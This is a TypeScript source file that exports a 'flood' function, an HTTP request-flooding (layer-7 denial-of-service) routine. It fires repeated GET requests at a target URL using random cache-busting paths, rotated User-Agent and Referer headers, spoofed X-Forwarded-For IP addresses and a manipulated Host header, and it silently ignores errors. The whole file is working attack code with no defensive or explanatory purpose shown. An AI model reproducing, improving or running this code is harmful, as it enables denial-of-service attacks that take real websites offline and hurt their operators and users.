import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randHex(len: number): string {
  const hex = "0123456789abcdef"
  let s = ""
  for (let i = 0; i < len; i++) s += hex[Math.floor(Math.random() * 16)]
  return s
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  const base = u.origin + u.pathname.replace(/\/$/, "")

  for (let i = 0; i < rpc; i++) {
    try {
      const hex = randHex(Math.random() > 0.5 ? 32 : Math.random() > 0.5 ? 64 : 128)
      const target = `${base}/${hex}`
      await fetch(target, {
        method: "GET",
        headers: {
          "User-Agent": randomChoice(USER_AGENTS),
          "Host": `${u.host}/${hex}`,
          "Referer": randomChoice(REFERERS),
          "X-Forwarded-For": randIp(),
          "Connection": "keep-alive",
        },
        redirect: "manual",
      })
      onStats(1, 400)
    } catch {}
  }
}
